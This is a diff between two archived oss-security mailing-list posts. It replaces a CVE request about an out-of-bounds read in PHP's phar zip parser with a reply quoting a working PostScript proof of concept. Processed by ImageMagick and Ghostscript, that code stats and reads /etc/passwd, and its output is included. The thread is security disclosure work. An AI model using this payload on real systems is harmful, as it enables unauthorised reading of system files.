@@ -1,58 +1,69 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/03/13/2
-Message-ID: <CAC1DjbY5DcefwkS8ba0iJj6sE8EM10PBE9YsyE59U9_MCmP8tg@mail.gmail.com>
-Date: Sun, 13 Mar 2016 11:01:33 +0200
-From: Dmitry Kasyanov <dkasyanov@...udlinux.com>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/09/29/5
+Message-ID: <877f9vcjd9.fsf@mid.deneb.enyo.de>
+Date: Thu, 29 Sep 2016 08:25:54 +0200
+From: Florian Weimer <fw@...eb.enyo.de>
 To: oss-security@...ts.openwall.com
-Subject: CVE Request: PHP-5.5.33: Out-of-Bound Read in phar_parse_zipfile
+Subject: Re: ImageMagick identify "d:" hangs
 Content-Type: text/plain; charset=utf-8
 
-An out-of-bounds read vulnerability was found in PHAR's
-phar_parse_zipfile() function.
+* Tavis Ormandy:
 
-Vulnerable code:
+> Here is the code I'm testing with (Note: I really don't know much
+> postscript - and I hate it).
+>
+> $ cat test.ps
+> /dumpname {
+>     dup             % copy filename
+>     dup             % copy filename
+>     print           % print filename
+>     (\n) print      % print newline
+>     status          % stat filename
+>     {
+>         (stat succeeded\n) print
+>         ( ctime:) print
+>         64 string cvs print
+>         ( atime:) print
+>         64 string cvs print
+>         ( size:) print
+>         64 string cvs print
+>         ( blocks:) print
+>         64 string cvs print
+>         (\n) print
+>         (\n) print
+>     }{
+>         (unable to stat\n\n) print
+>     } ifelse
+>     .libfile        % open as library
+>     {
+>         (.libfile returned file\n\n) print
+>         64 string readstring
+>         pop         % discard result (should proably test)
+>         print
+>         (\n) print
+>     }{
+>         (.libfile returned string\n) print
+>         print
+>         (\n) print
+>     } ifelse
+> } def
+>
+> (/etc/pass*) /dumpname load 256 string filenameforall
 
-ext/phar/zip.c:
+filenameforall was fixed as part of this:
 
-int phar_parse_zipfile(php_stream *fp, char *fname, int fname_len,
-char *alias, int alias_len, phar_archive_data** pphar, char **error)
-/* {{{ */
-{
-phar_zip_dir_end locator;
-char buf[sizeof(locator) + 65536];
-...
-while ((p=(char *) memchr(p + 1, 'P', (size_t) (size - (p + 1 -
-buf)))) != NULL) {
-if (!memcmp(p + 1, "K\5\6", 3)) {
-memcpy((void *)&locator, (void *) p, sizeof(locator));
-if (PHAR_GET_16(locator.centraldisk) != 0 ||
-PHAR_GET_16(locator.disknumber) != 0) {
-/* split archives not handled */
-php_stream_close(fp);
-if (error) {
-spprintf(error, 4096, "phar error: split archives spanning multiple
-zips cannot be processed in zip-based phar \"%s\"", fname);
-}
-return FAILURE;
-}
-...
+  http://git.ghostscript.com/?p=ghostpdl.git;a=commit;h=ab109aaeb3ddba59518b036fb288402a65cf7ce8
+  http://bugs.ghostscript.com/show_bug.cgi?id=694724
 
-The above code block tries to determine where in buf is "PK\x05\x06",
-which is actually "End of central directory record" structure of zip
-file. Then it copies 0x16 bytes from there to `phar_zip_dir_end
-locator`. If "PK\x05\x06" signature is located at end of `buf`
-variable, it will read out-of-bound `buf` variable and copy to
-`locator`.
+This also covers getenv and has already been assigned CVE-2013-5653.
 
-Details available at PHP bug tracker:
+> $ identify test.ps
+> /etc/passwd
+> stat succeeded
+>  ctime:1474998792 atime:1474998792 size:2662 blocks:8
+>
+> .libfile returned file
 
-https://bugs.php.net/bug.php?id=71498
+.libfile is not yet fixed upstream.  I reported this upstream:
 
-Patch:
-
-https://git.php.net/?p=php-src.git;a=commit;h=a6fdc5bb27b20d889de0cd29318b3968aabb57bd
-
-
--- 
-Dmitry Kasyanov  |  Developer
-dkasyanov@...udlinux.com
+  http://bugs.ghostscript.com/show_bug.cgi?id=697169
